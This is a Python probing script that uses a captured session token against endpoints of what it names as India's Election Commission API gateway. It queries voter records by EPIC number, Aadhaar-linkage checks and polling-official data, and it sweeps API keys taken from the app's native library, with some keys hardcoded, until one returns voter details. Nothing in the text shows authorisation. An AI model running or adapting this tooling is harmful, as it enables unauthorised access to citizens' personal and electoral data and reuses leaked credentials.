#!/usr/bin/env python3
"""
token_probe.py - exercise the Bearer-gated routes with a real session token.

The token is read from the git-ignored work/secrets.json ("bearer", written by
work/otp_login.py) and never printed.

Why the routes need it: the gateway answers `401 WWW-Authenticate: Bearer` with
no token, but `401 {"error":"Invalid credentials or token expired"}` with a bad
one - so the edge parses and validates tokens, and a valid one gets through to
the route's own checks (X-API-KEY for eepic/*, atkn_bnd/rtkn_bnd for the
document/part routes).

    python work/token_probe.py --epic TBG0342345
    python work/token_probe.py --epic TBG0342345 --sweep-keys
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import apikey_oracle  # noqa: E402
import key_oracle  # noqa: E402
import secrets_store  # noqa: E402

BASE = Path(__file__).resolve().parent
API = "https://gateway-vha.eci.gov.in/api/v1/"

BASE_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "applicationName": "VHA",
    "appName": "VHA",
    "channelidobo": "VHA",
    "platform-type": "ANDROIDMOB",
}


def load_token() -> str:
    cfg = secrets_store.read_config()
    raw = (cfg.get("bearer") or "").strip()
    # tolerate the value being stored with or without the scheme
    for prefix in ("Bearer ", "bearer "):
        if raw.startswith(prefix):
            raw = raw[len(prefix):].strip()
    return raw


def load_bound_tokens() -> tuple[str, str]:
    """atkn_bnd / rtkn_bnd from the same login response (fall back to the JWT)."""
    cfg = secrets_store.read_config()
    access = load_token()
    return (cfg.get("atkn_bnd") or access, cfg.get("rtkn_bnd") or access)


def call(method: str, path: str, token: str = "", headers: dict | None = None,
         body: dict | None = None, query: dict | None = None,
         raw_headers: bool = False, binary: bool = False):
    url = API + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, method=method, data=data)
    hdrs = {**BASE_HEADERS, **(headers or {})}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    for k, v in hdrs.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            blob = r.read()
            if binary:
                return r.status, r.headers.get("Content-Type"), len(blob)
            return r.status, r.headers.get("Content-Type"), blob.decode("utf-8", "replace")[:400]
    except urllib.error.HTTPError as e:
        blob = e.read()
        if binary:
            return e.code, e.headers.get("Content-Type"), len(blob)
        return e.code, e.headers.get("Content-Type"), blob.decode("utf-8", "replace")[:400]
    except Exception as e:  # noqa: BLE001
        return 0, None, f"{type(e).__name__}: {e}"


def show(label: str, status: int, ctype, raw) -> None:
    mark = "  <-- OPEN" if status in (200, 206) else ""
    print(f"{label:44s} -> {status}  ct={str(ctype)[:26]:26s} {str(raw)[:150]!r}{mark}")


def main() -> int:
    ap = argparse.ArgumentParser(description="Probe Bearer-gated routes")
    ap.add_argument("--epic", default="TBG0342345")
    ap.add_argument("--part-doc",
                    default="S01/Part/1/2/cadview_381b9e68-8c63-4030-bcaf-ef71d658e78e_2.jpg")
    ap.add_argument("--bucket", default="S01")
    ap.add_argument("--sweep-keys", action="store_true",
                    help="sweep native X-API-KEY candidates on the eepic routes")
    ap.add_argument("--delay", type=float, default=1.6)
    args = ap.parse_args()

    token = load_token()
    if not token:
        print("[token] no bearer in work/live_config.json", file=sys.stderr)
        return 2
    atkn, rtkn = load_bound_tokens()
    epic = args.epic.strip().upper()

    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        import base64
        claims = json.loads(base64.urlsafe_b64decode(payload))
        print(f"[token] sub={claims.get('sub')} role={(claims.get('realm_access') or {}).get('roles')}")
        import datetime
        exp = datetime.datetime.fromtimestamp(claims.get("exp", 0), datetime.timezone.utc)
        now = datetime.datetime.now(datetime.timezone.utc)
        print(f"[token] expires {exp.isoformat()} (in {(exp - now).total_seconds() / 3600:.1f} h)\n")
    except Exception:  # noqa: BLE001
        print("[token] (unparsed)\n")

    print("--- routes that need only Authorization ---")
    cases = [
        ("document/getFile (part CAD view)", "GET", "document/getFile",
         {"bucketName": args.bucket, "fileName": args.part_doc}, None, True),
        ("document-adhoc/getPresignedFile", "GET", "document-adhoc/getPresignedFile",
         {"bucketName": args.bucket, "fileName": args.part_doc}, None, True),
        ("vha/getPollingOfficials", "GET", "vha/getPollingOfficials",
         {"epicNo": epic}, None, False),
        ("form6b/checkEpicHasAdhar", "GET", f"form6b/get/checkEpicHasAdhar/{epic}",
         {}, None, False),
        ("citizen/sir/getDetailsByEpicNo", "GET", "citizen/sir/getDetailsByEpicNo",
         {"epic": epic}, None, False),
        ("citizen/sir/getDetailsByEroll", "GET", "citizen/sir/getDetailsByEroll",
         {"acNo": "1", "partNo": "2", "serialNo": "16"}, None, False),
        ("mservices EVP elector detail", "GET", "mservices/api/EVP/GetEVPElectorDetails",
         {"epicNo": epic}, None, False),
        ("elastic/get-by-epic-for-form", "POST", "elastic/get-by-epic-for-form",
         None, {"epicNumber": epic, "captchaId": "na", "captchaData": "na"}, False),
        ("citizen-hearing/fetchDetailsByEpicId", "POST",
         "citizen-hearing/fetchDetailsByEpicIdOrReferenceNo", None, {"epicId": 22497143}, False),
    ]
    for label, method, path, query, body, binary in cases:
        # the app replays every 401 with all three headers from T_USER_INFO
        extra = {"atkn_bnd": atkn, "rtkn_bnd": rtkn}
        if "form6b" in path or "sir" in path:
            extra.update({"currentRole": "citizen", "state": "S01"})
        st, ct, raw = call(method, path, token, extra, body, query, binary=binary)
        show(label, st, ct, f"{raw} bytes" if binary else raw)
        time.sleep(args.delay)

    print("\n--- eepic routes (need X-API-KEY too) ---")
    bomb = [("no key", {}),
            ("ECI…MOBILEAPPKEY", {"X-API-KEY": "ECINATIONALELECTORALSEARCH#1234MOBILEAPPKEY"}),
            ("GISTECIKEY", {"X-API-KEY": "ABCD1234#123521GISTECIKEY"})]
    if args.sweep_keys:
        texts = key_oracle.strings_in((BASE / "out/native/libnative_lib.so").read_bytes())
        bomb += [(k[:26], {"X-API-KEY": k})
                 for k in apikey_oracle.candidates(texts, 16, 200)][:14]
    for label, extra in bomb:
        for path, body in (
            ("eepic/GetElectorDetailForEEPIC", {"epicNo": epic}),
            ("eepic/GetElectorDetailForEEPIC", {"epic_no": epic}),
        ):
            st, ct, raw = call("POST", path, token, extra, body)
            shape = json.dumps(body)
            show(f"{label} | {shape}", st, ct, raw)
            if st == 200:
                (BASE / "out" / "eepic_detail.json").write_text(
                    json.dumps({"api_key": extra.get("X-API-KEY"), "body": body,
                                "response": raw}, indent=2), encoding="utf-8")
                print(f"     saved -> work/out/eepic_detail.json")
                return 0
            time.sleep(args.delay)
    return 0


if __name__ == "__main__":
    sys.exit(main())
